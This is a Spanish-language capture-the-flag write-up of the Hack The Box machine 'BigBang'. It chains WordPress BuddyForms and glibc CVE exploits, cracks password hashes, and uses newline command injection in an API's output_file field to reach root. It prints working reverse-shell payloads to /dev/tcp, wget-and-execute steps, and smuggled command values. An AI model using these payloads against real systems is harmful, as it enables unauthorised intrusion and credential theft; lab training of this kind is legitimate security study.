---
title: BigBang
description: BigBang es una máquina Linux de dificultad dificil que involucra un sitio de WordPress con el plugin BuddyForms, comenzando con la investigación de la CVE-2023-26326, que permite subir un archivo polyglot PHAR/GIF. Aunque esto no funciona de inmediato, proporciona información útil sobre cómo se leen los archivos GIF, lo cual puede reutilizarse para acceder a archivos locales. Aprovechando una herramienta basada en filtros de PHP, se explota esto para leer archivos arbitrarios y utilizar la información obtenida para desencadenar la CVE-2024-2961, una vulnerabilidad en Glibc que permite ejecución remota de código. Tras obtener acceso, se localizan las credenciales de la base de datos de WordPress en los archivos de configuración. La base de datos contiene hashes de contraseñas que pueden romperse para recuperar la contraseña del usuario shawking. Una enumeración adicional de archivos revela la base de datos de Grafana, que también contiene hashes de contraseñas de usuarios, los cuales pueden romperse para obtener la contraseña del usuario developer. Para la escalada de privilegios, se analiza una aplicación de Android presente en el directorio home del usuario developer, se examina su API y se explota una inyección de comandos en una de sus funciones para obtener acceso a nivel root.
date: 2025-03-22
toc: true
pin: false
image:
 path: /assets/img/htb-writeup-bigbang/bigbang_logo.png
categories:
  - Hack_The_Box
  - Machines
tags:
  - linux
  - hack_the_box
  - tcp
  - http
  - ssh
  - wordpress
  - php
  - cve
  - insecure_deserialization
  - rce
  - interactive_tty
  - password_attacks
  - port_forwarding
  - fuzzing_web
  - apk
  - api
  - os_command_injection
  - rfi
  - information_gathering
  - web_analysis
  - cve_exploitation
  - lateral_movement
  - lateral_movement
  - privilege_escalation

---
## Information Gathering

El análisis inicial comienza con el comando ping para confirmar la accesibilidad de la máquina objetivo en la red.

```terminal
/home/kali/Documents/htb/machines/bigbang:-$ ping -c 1 10.10.11.52
PING 10.10.11.52 (10.10.11.52) 56(84) bytes of data.
64 bytes from 10.10.11.52: icmp_seq=1 ttl=63 time=1117 ms

--- 10.10.11.52 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 1116.788/1116.788/1116.788/0.000 ms
```

Realizo un escaneo agresivo de puertos con nmap, lo que me permite identificar rápidamente todos los puertos abiertos.

```terminal
/home/kali/Documents/htb/machines/bigbang:-$ sudo nmap -p- --open -sS --min-rate 5000 -vvv 10.10.11.52 -n -Pn -oG nmap1
Host: 10.10.11.52 ()	Status: Up
Host: 10.10.11.52 ()	Ports: 22/open/tcp//ssh///, 80/open/tcp//http///	Ignored State: closed (65533)
```

Profundizo en los puertos detectados, recopilando información detallada sobre los servicios y versiones en ejecución.

```terminal
/home/kali/Documents/htb/machines/bigbang:-$ sudo nmap -sCV -p22,80 -vvv 10.10.11.52 -oN nmap2
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 d4:15:77:1e:82:2b:2f:f1:cc:96:c6:28:c1:86:6b:3f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBET3VRLx4oR61tt3uTowkXZzNICnY44UpSL7zW4DLrn576oycUCy2Tvbu7bRvjjkUAjg4G080jxHLRJGI4NJoWQ=
|   256 6c:42:60:7b:ba:ba:67:24:0f:0c:ac:5d:be:92:0c:66 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILbYOg6bg7lmU60H4seqYXpE3APnWEqfJwg1ojft/DPI
80/tcp open  http    syn-ack ttl 62 Apache httpd 2.4.62
|_http-title: Did not follow redirect to http://blog.bigbang.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.62 (Debian)
Service Info: Host: blog.bigbang.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

```terminal
/home/kali/Documents/htb/machines/bigbang:-$ echo '10.10.11.52\tbigbang.htb\tblog.bigbang.htb' | sudo tee -a /etc/hosts

/home/kali/Documents/htb/machines/bigbang:-$ whatweb bigbang.htb
http://bigbang.htb [301 Moved Permanently] Apache[2.4.62], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.62 (Debian)], IP[10.10.11.52], RedirectLocation[http://blog.bigbang.htb/], Title[301 Moved Permanently]
http://blog.bigbang.htb/ [200 OK] Apache[2.4.62], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.62 (Debian)], IP[10.10.11.52], JQuery[3.7.1], MetaGenerator[WordPress 6.5.4], PHP[8.3.2], PasswordField[pwd], Script[importmap,module,text/html,text/javascript], Title[BigBang], UncommonHeaders[link], WordPress[6.5.4], X-Powered-By[PHP/8.3.2]
```

---
## Web Analysis

El sitio web principal no presenta contenido relevante en un primer análisis.

![](assets/img/htb-writeup-bigbang/bigbang1_1.png)

Tal como se detectó en la salida de whatweb, el servicio utiliza WordPress como CMS. Para profundizar en la enumeración, utilizó wpscan con la opción de detección agresiva de plugins, temas y usuarios.

```terminal
/home/kali/Documents/htb/machines/bigbang:-$ wpscan --url http://blog.bigbang.htb --enumerate vp,u,tt --plugins-version-detection aggressive --api-token='<WPSCAN-TOKEN>' 
```

![](assets/img/htb-writeup-bigbang/bigbang1_2.png)
![](assets/img/htb-writeup-bigbang/bigbang1_3.png)


El escaneo reveló la presencia del plugin BuddyForms, cuya versión está desactualizada. Se identificó además la vulnerabilidad crítica [CVE-2023-26326](https://nvd.nist.gov/vuln/detail/cve-2023-26326). Esta vulnerabilidad permite a un atacante remoto deserializar objetos PHP arbitrarios, lo cual podría conducir a la ejecución de código si se encuentra una cadena POP adecuada en el entorno. Además, se enumeraron exitosamente dos usuarios del sistema WordPress, `root` y `shawking`.

---
## CVE Exploitation

Para explotar la vulnerabilidad CVE-2023-26326 en el plugin BuddyForms, utilicé un exploit público disponible en GitHub, el cual combina esta vulnerabilidad con CVE-2024-2961 para lograr la ejecución remota de comandos.

```terminal
/home/kali/Documents/htb/machines/bigbang:-$ git clone https://github.com/omarelshopky/exploit_cve-2023-26326_using_cve-2024-2961.git

/home/kali/Documents/htb/machines/bigbang:-$ nc -lnvp 4321
	listening on [any] 4321 ...
```

Lanzo el exploit apuntando al endpoint vulnerable `admin-ajax.php`, con una carga útil en bash que establece la conexión inversa.

```terminal
(venv)-/home/kali/Documents/htb/machines/bigbang:-$ python3 exploit.py http://blog.bigbang.htb/wp-admin/admin-ajax.php 'bash -c "bash -i >& /dev/tcp/10.10.16.49/4321 0>&1"'
[*] Potential heaps: 0x7f471b600040, 0x7f471b400040, 0x7f471a000040, 0x7f4717a00040, 0x7f4716000040 (using first)
     EXPLOIT  SUCCESS

	... connect to [10.10.16.49] from (UNKNOWN) [10.10.11.52] 45922
www-data@8e3a72b5e980:/var/www/html/wordpress/wp-admin$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---
## Lateral Movement

Para mejorar la interactividad de la reverse shell obtenida, convierto la consola en una pseudo terminal completa.

```terminal
www-data@8e3a72b5e980:/var/www/html/wordpress/wp-admin$ script /dev/null -c bash
www-data@8e3a72b5e980:/var/www/html/wordpress/wp-admin$ ^Z
/home/kali/Documents/htb/machines/bigbang:-$ stty raw -echo;fg
[1]  + continued  nc -lnvp 4321
                               reset xterm
www-data@8e3a72b5e980:/var/www/html/wordpress/wp-admin$ export TERM=xterm
www-data@8e3a72b5e980:/var/www/html/wordpress/wp-admin$ export SHELL=bash
www-data@8e3a72b5e980:/tmp$ stty rows 40 columns 133
```

A continuación, reviso el archivo de configuración de WordPress `wp-config.php`, donde encuentro las credenciales para una base de datos MySQL.

```terminal
www-data@8e3a72b5e980:/var/www/html/wordpress$ head -33 wp-config.php
```

![](assets/img/htb-writeup-bigbang/bigbang2_1.png)

Como MySQL no expone el puerto 3306 directamente a la red externa, utilizo un túnel reverso con chisel para acceder al servicio desde mi máquina atacante. Primero, descargo y levanto un servido en kali para transferir el binario de chisel.

```terminal
/home/kali/Documents/htb/machines/bigbang:-$ wget https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_linux_amd64.gz
/home/kali/Documents/htb/machines/bigbang:-$ python3 -m http.server
```

Luego, desde la máquina comprometida, descargo el binario y preparo el túnel reverso

```terminal
www-data@8e3a72b5e980:/tmp$ wget http://10.10.16.49:8000/chisel_1.10.1_linux_amd64.gz

/home/kali/Documents/htb/machines/bigbang:-$ chisel server --reverse -p 4444

www-data@8e3a72b5e980:/tmp$ ./chisel_1.10.1_linux_amd64 client 10.10.16.49:4444 R:3306:172.17.0.1:3306
```

Accedo a la base de datos MySQL utilizando las credenciales extraídas del archivo `wp-config.php`. Una vez dentro, selecciono la base de datos de WordPress y consulto la informacion de lo usuarios existentes.

```terminal
/home/kali/Documents/htb/machines/bigbang:-$ mysql -u wp_user -p -h 127.0.0.1 -P 3306 
Enter password: wp_password

MySQL [(none)]> USE wordpress;

MySQL [wordpress]> SHOW tables;
+-----------------------+
| Tables_in_wordpress   |
+-----------------------+
| wp_commentmeta        |
| wp_comments           |
| wp_links              |
| wp_options            |
| wp_postmeta           |
| wp_posts              |
| wp_term_relationships |
| wp_term_taxonomy      |
| wp_termmeta           |
| wp_terms              |
| wp_usermeta           |
| wp_users              |
+-----------------------+

MySQL [wordpress]> SELECT * FROM wp_users;
+----+------------+------------------------------------+---------------+----------------------+-------------------------+---------------------+---------------------+-------------+-----------------+
| ID | user_login | user_pass                          | user_nicename | user_email           | user_url                | user_registered     | user_activation_key | user_status | display_name    |
+----+------------+------------------------------------+---------------+----------------------+-------------------------+---------------------+---------------------+-------------+-----------------+
|  1 | root       | $P$Beh5HLRUlTi1LpLEAstRyXaaBOJICj1 | root          | root@bigbang.htb     | http://blog.bigbang.htb | 2024-05-31 13:06:58 |                     |           0 | root            |
|  3 | shawking   | $P$Br7LUHG9NjNk6/QSYm2chNHfxWdoK./ | shawking      | shawking@bigbang.htb |                         | 2024-06-01 10:39:55 |                     |           0 | Stephen Hawking |
+----+------------+------------------------------------+---------------+----------------------+-------------------------+---------------------+---------------------+-------------+-----------------+
```

Identifico que el hash pertenece al sistema de contraseñas phpass, utilizado por defecto en WordPress, y verifico que es compatible con Hashcat. Confirmo que el formato del hash es válido y detecto el modo adecuado para el crackeo.

```terminal
/home/kali/Documents/htb/machines/bigbang:-$ hashcat --show shawking_hash.txt
   # | Name                                            | Category
=====+=================================================+==============================
 400 | phpass                                          | Generic KDF
```

Ejecuto un ataque de diccionario utilizando contra el hash del usuario `shawking`, utilizando la lista de palabras `rockyou.txt`.

```terminal
/home/kali/Documents/htb/machines/bigbang:-$ hashcat -a 0 -m 400 shawking_hash.txt /usr/share/wordlists/rockyou.txt
$P$Br7LUHG9NjNk6/QSYm2chNHfxWdoK./:quantumphysics
```

La herramienta logra recuperar la contraseña del usuario, con estas credenciales, establezco una conexión SSH al sistema.

```terminal
/home/kali/Documents/htb/machines/bigbang:-$ ssh shawking@bigbang.htb
shawking@bigbang.htb's password: quantumphysics

shawking@bigbang:~$ id
uid=1001(shawking) gid=1001(shawking) groups=1001(shawking)

shawking@bigbang:~$ cat user.txt
```

---


Identifico los usuarios del sistema que tienen una shell válida.

```terminal
shawking@bigbang:~$ grep 'sh$' /etc/passwd
root:x:0:0:root:/root:/bin/bash
shawking:x:1001:1001:Stephen Hawking,,,:/home/shawking:/bin/bash
developer:x:1002:1002:,,,:/home/developer:/bin/bash
```

Observo la presencia del usuario `developer`, lo que sugiere un posible punto de pivot. Intento autenticación local, utilizando el nombre de la máquina como contraseña `bigbang` y esta resulta ser válida.

```terminal
shawking@bigbang:~$ su developer
Password: bigbang

developer@bigbang:~$ id
uid=1002(developer) gid=1002(developer) groups=1002(developer)
```

---
## Privilege Escalation


Identifico un servicio local escuchando en el puerto 9090.

```terminal
shawking@bigbang:~$ ss -tulnp
```

![](assets/img/htb-writeup-bigbang/bigbang3_1.png)

Verifico manualmente el contenido del servicio, y confirmo que responde con un error 404, lo que indica que efectivamente está en funcionamiento.

```terminal
shawking@bigbang:~$ curl 127.0.0.1:9090
<!doctype html>
<html lang=en>
<title>404 Not Found</title>
<h1>Not Found</h1>
<p>The requested URL was not found on the server. If you entered the URL manually plng and try again.</p>
```

Redirijo el puerto 9090 de la máquina objetivo hacia mi sistema local y así poder analizarlo desde el navegador.

```terminal
/home/kali/Documents/htb/machines/bigbang:-$ ssh -L 9090:127.0.0.1:9090 developer@bigbang.htb -f -N 
developer@bigbang.htb's password: bigbang
```

Una vez establecido el túnel, accedo a `http://127.0.0.1:9090` desde el navegador para continuar con el análisis del servicio.

![](assets/img/htb-writeup-bigbang/bigbang3_2.png)

Enumero los posibles endpoints utilizando Gobuster.

```terminal
/home/kali/Documents/htb/machines/bigbang:-$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://127.0.0.1:9090/
/command              (Status: 405) [Size: 153]
/login                (Status: 405) [Size: 153]
```

![](assets/img/htb-writeup-bigbang/bigbang3_3.png)

El endpoint `/login` devuelve un error 405 Method Not Allowed al acceder mediante una petición GET, lo cual sugiere que el endpoint podría requerir otro tipo de método HTTP, como POST. Intercepto la solicitud en Burp Suite y la modifico manualmente.

* Método: `POST`
* Encabezado: `Content-Type: application/json`
* Cuerpo: `{"username": "developer", "password": "bigbang"}`

![](assets/img/htb-writeup-bigbang/bigbang3_4.png)

La respuesta es exitosa y devuelve un access token en formato JWT, lo cual confirma que la autenticación fue exitosa.

Este mismo proceso puede replicarse desde la terminal. Con el access token obtenido, estoy en condiciones de interactuar con el endpoint `/command` servicio web.

```terminal
/home/kali/Documents/htb/machines/bigbang:-$ curl -s -X POST http://127.0.0.1:9090/login -H "Content-Type: application/json" -d '{"username": "developer", "password": "bigbang"}'
{"access_token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTc0MjYwODkwNywianRpIjoiZGFlNjRlYzktYTE2Mi00NzM0LTg5Y2YtY2U0NjQwZjA5OWNjIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6ImRldmVsb3BlciIsIm5iZiI6MTc0MjYwODkwNywiY3NyZiI6IjM1M2I2NmY2LTJhM2QtNDgzOS04YjMzLWU2YmQwOWI0YmVjOCIsImV4cCI6MTc0MjYxMjUwN30.8PUvGavbeR83-R7JDIrWpbKnId17dfCUFtJMgIbyJJU"}
```
---

En el directorio personal del usuario `developer` encuentro un archivo apk.

```terminal
developer@bigbang:~$ ls -al android/satellite-app.apk 
-rw-rw-r-- 1 developer developer 2470974 Jun  7  2024 android/satellite-app.apk

/home/kali/Documents/htb/machines/bigbang:-$ scp developer@bigbang.htb:/home/developer/android/satellite-app.apk .
developer@bigbang.htb's password: bigbang

/home/kali/Documents/htb/machines/bigbang:-$ file satellite-app.apk
satellite-app.apk: Android package (APK), with gradle app-metadata.properties, with APK Signing Block
```

Tras transferir el archivo a mi máquina de análisis, lo abro para examinar su estructura.

```terminal
/home/kali/Documents/htb/machines/bigbang:-$ jadx-gui satellite-app.apk
```

El análisis muestra que la aplicación móvil replica exactamente la lógica del servicio web que corre en el puerto 9090.

![](assets/img/htb-writeup-bigbang/bigbang4_1.png)

El código descompilado del APK revela que la clase `b`, una clase interna de `TakePictureActivity`, ejecuta una solicitud HTTP POST hacia el endpoint vulnerable.

![](assets/img/htb-writeup-bigbang/bigbang4_2.png)

En el método `doInBackground`, el parámetro `output_file` se construye dinámicamente en el cuerpo del JSON.

Como `this.f3686a` es directamente tomado desde la entrada del usuario `objArr[0]`, es posible manipular su contenido para incluir un salto de línea `\n` y comandos adicionales. El servidor parece interpretar cada línea como una instrucción separada, lo que permite ejecutar comandos arbitrarios.

---

El endpoint `/command` contiene dos argumentos principales, `command` (nombre del comando a ejecutar) y `output_file` (archivo de salida donde se almacena el resultado). Pruebo realizar una solicitud legítima pero el servidor falla al generar una imagen.

```terminal
developer@bigbang:/tmp$ curl -POST http://127.0.0.1:9090/command -H "Content-type:application/json" -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTc0NzMyNDE0MSwianRpIjoiMzdjMmVlMWEtOTExZi00Y2NkLWE5YmYtNDE2M2E1YzQzNjZkIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6ImRldmVsb3BlciIsIm5iZiI6MTc0NzMyNDE0MSwiY3NyZiI6ImMyNDBmMGJhLWM5MDAtNGU5Yy1iYmU3LWQ2MjFlYmIyNmU0NyIsImV4cCI6MTc0NzMyNzc0MX0.pqD7zHDgeVztzfgNhgencrex2Q7vTMnl-A0FPMKqJd4" -d '{"command":"send_image", "output_file": "test.png"}'
{"error":"Error generating image: "}
```

El parámetro `output_file` es vulnerable a inyecciones de comandos, pero cuenta con un mecanismo de validación que detecta caracteres peligrosos como `;`.

```terminal
developer@bigbang:/tmp$ curl -POST http://127.0.0.1:9090/command -H "Content-type:application/json" -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTc0NzMyNDE0MSwianRpIjoiMzdjMmVlMWEtOTExZi00Y2NkLWE5YmYtNDE2M2E1YzQzNjZkIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6ImRldmVsb3BlciIsIm5iZiI6MTc0NzMyNDE0MSwiY3NyZiI6ImMyNDBmMGJhLWM5MDAtNGU5Yy1iYmU3LWQ2MjFlYmIyNmU0NyIsImV4cCI6MTc0NzMyNzc0MX0.pqD7zHDgeVztzfgNhgencrex2Q7vTMnl-A0FPMKqJd4" -d '{"command":"send_image", "output_file": "test.png;id"}'
{"error":"Output file path contains dangerus characters"}
```

El servidor bloquea todos los caracteres comúnmente usados en inyecciones de comandos. Sin embargo, al usar el carácter de nueva línea `\n`. En lugar de devolver el error `Output file path contains dangerous characters`, el servidor intentó interpretar todo el contenido como una ruta de archivo, lo que sugiere que no se está filtrando este carácter.

```terminal
/home/kali/Documents/htb/machines/bigbang:-$ sudo tcpdump -i tun0 icmp
[sudo] password for kali: 
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
```

Aunque el error devuelto indica que no pudo leer el archivo, la ejecución de ping fue exitosa, esto confirma la inyeccion de comandos.

```terminal
developer@bigbang:/tmp$ curl -POST http://127.0.0.1:9090/command -H "Content-type:application/json" -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTc0NzMyNDE0MSwianRpIjoiMzdjMmVlMWEtOTExZi00Y2NkLWE5YmYtNDE2M2E1YzQzNjZkIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6ImRldmVsb3BlciIsIm5iZiI6MTc0NzMyNDE0MSwiY3NyZiI6ImMyNDBmMGJhLWM5MDAtNGU5Yy1iYmU3LWQ2MjFlYmIyNmU0NyIsImV4cCI6MTc0NzMyNzc0MX0.pqD7zHDgeVztzfgNhgencrex2Q7vTMnl-A0FPMKqJd4" -d '{"command":"send_image", "output_file": "test.png\nping -c 1 10.10.14.249"}'
{"error":"Error reading image file: [Errno 2] No such file or directory: 'test.png\\nping -c 1 10.10.14.249'"}
```

```terminal
13:01:40.868424 IP bigbang.htb > 10.10.14.249: ICMP echo request, id 2, seq 1, length 64
13:01:40.868466 IP 10.10.14.249 > bigbang.htb: ICMP echo reply, id 2, seq 1, length 64
```

---

Luego de confirmar la ejecución de comandos mediante inyección en el parámetro `output_file`, se procedió a ejecutar una reverse shell para obtener acceso interactivo como root.

* Generó un script que establece una conexión inversa hacia mi maquina de atacante y sirvo el archivo desde un servidor http.

* Luego utilizó el mismo punto de inyección para descargar el script en la máquina víctima.

```terminal
/home/kali/Documents/htb/machines/bigbang:-$ echo -e '#!/bin/bash\n\nbash -i >& /dev/tcp/10.10.14.249/443 0>&1' > shell

/home/kali/Documents/htb/machines/bigbang:-$ python3 -m http.server

developer@bigbang:/tmp$ curl -POST http://127.0.0.1:9090/command -H "Content-type:application/json" -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTc0NzMyNDE0MSwianRpIjoiMzdjMmVlMWEtOTExZi00Y2NkLWE5YmYtNDE2M2E1YzQzNjZkIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6ImRldmVsb3BlciIsIm5iZiI6MTc0NzMyNDE0MSwiY3NyZiI6ImMyNDBmMGJhLWM5MDAtNGU5Yy1iYmU3LWQ2MjFlYmIyNmU0NyIsImV4cCI6MTc0NzMyNzc0MX0.pqD7zHDgeVztzfgNhgencrex2Q7vTMnl-A0FPMKqJd4" -d '{"command":"send_image", "output_file": "test.png\nwget http://10.10.14.249:8000/shell -O /tmp/shell"}'
{"error":"Error reading image file: [Errno 2] No such file or directory: 'test.png\\nwget http://10.10.14.249:8000/shell -O /tmp/shell'"}
```

* Levanto un listener con netcat y ejecutó la shell remota en la víctima.

```terminal
$ sudo nc -lnvp 443           
	listening on [any] 443 ...

developer@bigbang:/tmp$ curl -POST http://127.0.0.1:9090/command -H "Content-type:application/json" -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTc0NzMyNDE0MSwianRpIjoiMzdjMmVlMWEtOTExZi00Y2NkLWE5YmYtNDE2M2E1YzQzNjZkIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6ImRldmVsb3BlciIsIm5iZiI6MTc0NzMyNDE0MSwiY3NyZiI6ImMyNDBmMGJhLWM5MDAtNGU5Yy1iYmU3LWQ2MjFlYmIyNmU0NyIsImV4cCI6MTc0NzMyNzc0MX0.pqD7zHDgeVztzfgNhgencrex2Q7vTMnl-A0FPMKqJd4" -d '{"command":"send_image", "output_file": "test.png\n/bin/bash /tmp/shell"}'
```

De este modo obtengo acceso como `root` al sistema.

```terminal
	... connect to [10.10.14.249] from (UNKNOWN) [10.10.11.52] 56468
root@bigbang:/# id
uid=0(root) gid=0(root) groups=0(root)

root@bigbang:/# cat /root/root.txt
```

> <a href="https://www.hackthebox.com/achievement/machine/1521382/645" target="_blank">BigBang Machine from Hack The Box has been Pwned</a>
{: .prompt-tip }
